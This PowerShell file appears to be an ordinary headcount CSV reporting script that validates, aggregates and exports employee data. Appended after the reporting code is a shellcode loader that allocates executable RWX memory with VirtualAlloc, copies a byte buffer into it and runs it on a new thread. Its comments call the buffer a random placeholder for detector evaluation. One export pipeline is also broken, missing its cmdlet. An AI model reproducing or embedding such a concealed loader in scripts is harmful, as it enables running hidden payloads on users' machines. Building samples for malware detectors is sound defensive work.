<#
.SYNOPSIS
    Reads an exported employee CSV and writes an aggregated summary report.
.DESCRIPTION
    Validates the column layout of the source file, converts the Amount column
    to a number and aggregates headcount and spend per department or site.
    Missing columns are reported as a hard error so a changed export cannot
    silently produce an empty report.
.EXAMPLE
    .\Convert-CsvSummary.ps1 -InputCsv C:\Data\exports\headcount.csv
.EXAMPLE
    .\Convert-CsvSummary.ps1 -GroupBy Site -MinAmount 10000
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$InputCsv = 'C:\Data\exports\headcount.csv',
    [string]$OutputPath = 'D:\Ops\reports\headcount-summary-2024-05-12.csv',
    [Parameter(Mandatory = $false)]
    [ValidateSet("Department", 'Site')]
    [string]$GroupBy = "Site",
    [double]$MinAmount = 10000
)

$ErrorActionPreference = 'Stop'
$InformationPreference = 'SilentlyContinue'
$culture = [System.Globalization.CultureInfo]::InvariantCulture
Set-StrictMode -Version 2.0

if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ','
if (@($rows).Count -eq 0) {
    throw 'The input CSV contains no data rows.'
}
$required = @('EmployeeId', 'Name', 'Department', 'Site', 'Amount')
$available = $rows[0].PSObject.Properties.Name
$missing = @($required | Where-Object { $available -notcontains $_ })
if ($missing.Count -gt 0) {
    throw ("Missing column(s): {0}" -f ($missing -join ', '))
}
$rows | ForEach-Object { $_.Amount = [double]$_.Amount }

$byGroup = $rows | Group-Object -Property $GroupBy | ForEach-Object {
    $sum = ($_.Group | Measure-Object -Property Amount -Sum).Sum
    [pscustomobject]@{
        Group     = $_.Name
        Metric    = $GroupBy
        Employees = $_.Count
        Total     = [math]::Round($sum, 2)
        Average   = [math]::Round(($sum / $_.Count), 2)
    }
}
$grandTotal = [math]::Round((($rows | Measure-Object -Property Amount -Sum).Sum), 2)
$rowCount = @($rows).Count

$byGroup | Sort-Object -Property Total -Descending |
    -Path $OutputPath `
    -NoTypeInformation
$aboveThreshold = $byGroup | Where-Object { $_.Total -ge $MinAmount }
$aboveThreshold | Export-Csv -Path $OutputPath.Replace('.csv', '-filtered.csv') -NoTypeInformation -Encoding UTF8

$bySite = $rows | Group-Object -Property Site | ForEach-Object {
    [pscustomobject]@{
        Site      = $_.Name
        Employees = $_.Count
        Total     = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
}
$bySite | Sort-Object -Property Total -Descending | Format-Table -AutoSize

$duplicates = $rows | Group-Object -Property EmployeeId |
    Where-Object { $_.Count -gt 1 } |
    Select-Object Name, Count
if (@($duplicates).Count -gt 0) {
    Write-Warning ("Duplicate employee ids: {0}" -f @($duplicates).Count)
}

$style = @'
<style>
body { font-family: Arial; font-size: 13px; }
table { border-collapse: collapse; width: 100%; }
th { background: #e8eef7; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$byGroup | Sort-Object -Property Total -Descending |
    ConvertTo-Html -Title 'Headcount summary' -Head $style |
    Set-Content -Path $OutputPath.Replace('.csv', '.html') -Encoding UTF8

$jsonBody = $byGroup | ConvertTo-Json -Depth 5
$jsonBody | Set-Content -Path $OutputPath.Replace('.csv', '.json') -Encoding UTF8

$bySite | Export-Csv -Path $OutputPath.Replace('.csv', '-by-site.csv') -NoTypeInformation -Encoding UTF8

$summaryBody = @"
Rows processed : $rowCount
Grand total    : $grandTotal
Groups         : $($byGroup.Count)
Output         : $OutputPath
"@

$MailTo = 'reporting@contoso.com'
$MailFrom = "bi@contoso.com"

$mailParams = @{
    To         = $MailTo
    From       = $MailFrom
    Subject    = 'Headcount summary'
    Body       = $summaryBody
    SmtpServer = "smtp.contoso.com"
    Port       = 25
    UseSsl     = $true
}
Send-MailMessage @mailParams

Write-Host ("Report written to {0}" -f $OutputPath) -ForegroundColor Green
Write-Verbose ("Filtered groups above threshold: {0}" -f @($aboveThreshold).Count)

$largest = $rows | Sort-Object -Property Amount -Descending | Select-Object -First 5
$largest | Format-Table Name, Department, Amount -AutoSize

$byCostCenter = $rows | Where-Object { $_.PSObject.Properties.Name -contains 'CostCenter' } |
    Group-Object -Property CostCenter | Sort-Object -Property Count -Descending | Select-Object -First 5
$byCostCenter | Format-Table Name, Count -AutoSize

$sample = $rows | Select-Object -First 3
$sample | Format-Table -AutoSize | Out-String | Write-Verbose

$culture = [System.Globalization.CultureInfo]::GetCultureInfo('en-US')
$formatted = $grandTotal.ToString('C2', $culture)
Write-Verbose ("Formatted total: {0}" -f $formatted)

$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}

$average = ($rows | Measure-Object -Property Amount -Average).Average
Write-Verbose ("Average amount: {0:N2}" -f $average)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

$LogPath = "$env:TEMP\loader.log"

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class MemoryApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x14, 0xc9, 0x0a, 0x87, 0x14, 0x74, 0x79, 0xdc, 0x83, 0xe9, 0x36, 0xef, 0xac, 0x17, 0x6a, 0xa5,
    0x36, 0x7f, 0x9e, 0x3a, 0x0e, 0x8a, 0x17, 0x46, 0x26, 0x31, 0x0e, 0x4a, 0x1d, 0x18, 0x4b, 0x67,
    0x21, 0xfe, 0x94, 0xb7, 0xa3, 0xf9, 0xbb, 0x29, 0x59, 0x84, 0x8d, 0xaf, 0x77, 0x38, 0xd9, 0xd0,
    0x70, 0x61, 0x23, 0xe0, 0x25, 0x5c, 0x76, 0x3d, 0x57, 0x0b, 0x33, 0x59, 0xbe, 0xb8, 0x9a, 0xbe,
    0xe5, 0x4a, 0x44, 0xa5, 0x14, 0x17, 0x93, 0x07, 0x72, 0x3c, 0x56, 0xc6, 0xcf, 0x0a, 0x6a, 0x11,
    0xfc, 0xd7, 0x1c, 0x14, 0x21, 0x4c, 0x9e, 0xbf, 0xaf, 0x1d, 0x03, 0x22, 0x69, 0xb9, 0x84, 0xae,
    0x6f, 0xe4, 0x3f, 0x45, 0xe5, 0x71, 0xa0, 0x51, 0x03, 0x69, 0xe3, 0xde, 0xdd, 0x66, 0x35, 0x00,
    0x80, 0xfc, 0x53, 0xd8, 0x94, 0x69, 0x25, 0xa9, 0x68, 0x92, 0x76, 0xde, 0xb7, 0xc2, 0xd0, 0x96,
    0x6a, 0x4d, 0xbd, 0x9e, 0x3e, 0x59, 0xf0, 0xd8, 0xcd, 0x88, 0x24, 0xca, 0x99, 0x5b, 0x56, 0x65,
    0xe5, 0x3d, 0x2d, 0x72, 0xbc, 0xec, 0x51, 0x07, 0x3e, 0x46, 0xee, 0x27, 0x12, 0x29, 0xa8, 0x34,
    0x6b, 0xec, 0x97, 0xcd, 0x33, 0x1a, 0xa4, 0x8d, 0x43, 0x47, 0x0a, 0xb6, 0x3a, 0x20, 0xc2, 0x4a,
    0x40, 0xe0, 0xe3, 0x4b, 0x31, 0x93, 0xe0, 0x8e, 0x4f, 0x14, 0xa9, 0x26, 0x07, 0xb4, 0x5b, 0x50,
    0xe9, 0x74, 0x97, 0x6a, 0x04, 0x79, 0xf0, 0xaf, 0x2d, 0x93, 0xbe, 0x93, 0xd5, 0x3f, 0xfe, 0x42,
    0xa3, 0xeb, 0x10, 0x5f, 0x78, 0x8c, 0xa1, 0x07, 0x67, 0x9b, 0x19, 0x03, 0xd9, 0xa1, 0x69, 0xb0,
    0xa2, 0x78, 0xc3, 0x3e, 0x7c, 0x69, 0xf8, 0x32, 0xa3, 0xb7, 0xfe, 0x55, 0xac, 0xf5, 0xa1, 0xd8,
    0x96, 0x16, 0x25, 0x26, 0x78, 0x3f, 0xf6, 0x9c, 0x9d, 0xda, 0x52, 0x3c, 0x97, 0x71, 0x89, 0x46,
    0x42, 0x13, 0x79, 0xd0, 0xdf, 0x06, 0x79, 0x6b, 0x59, 0xdf, 0x2d, 0xe0, 0x95, 0x18, 0x91, 0x88,
    0x68, 0x33, 0x51, 0x7b, 0x59, 0x75, 0x60, 0x95, 0x7f, 0x1b, 0x9d, 0xfd, 0xa5, 0x8a, 0x65, 0x36,
    0xda, 0xba, 0x85, 0x83, 0xf6, 0xd1, 0xf1, 0xec, 0x30, 0x94, 0x7c, 0x1d, 0x00, 0xf9, 0x00, 0xe9,
    0x37, 0xf9, 0xae, 0xd4, 0x46, 0xf9, 0x73, 0x6b, 0x9e, 0x4e, 0xdb, 0xa3, 0x47, 0x57, 0xd9, 0xcd,
    0x8d, 0x30, 0xc2, 0x97, 0xc9, 0x17, 0x66, 0xf2, 0xd4, 0x2e, 0x6c, 0x3e, 0x90, 0xbe, 0xf3, 0x9f,
    0x77, 0x87, 0x24, 0x5b, 0x29, 0xe7, 0x18, 0xba, 0xc9, 0x9c, 0x09, 0xe3, 0x92, 0xba, 0xa7, 0x42,
    0x5f, 0x81, 0x7b, 0x3f, 0xfb, 0xb8, 0x95, 0xe7, 0xa5, 0xcf, 0x8d, 0xdd, 0x27, 0x56, 0x14, 0xc9,
    0x52, 0x84, 0x91, 0x13, 0xcd, 0x19, 0x31, 0xc3, 0x8c, 0xe7, 0x56, 0xb5, 0xbb, 0x54, 0x13, 0xa7,
    0x97, 0xea, 0xd8, 0x93, 0xb7, 0x9d, 0xa2, 0xd0, 0xc5
)

$ProcHandle = [MemoryApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($ProcHandle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
$ThreadId = 0
$Thread = [MemoryApi]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][MemoryApi]::WaitForSingleObject($Thread, 2501)
[void][MemoryApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
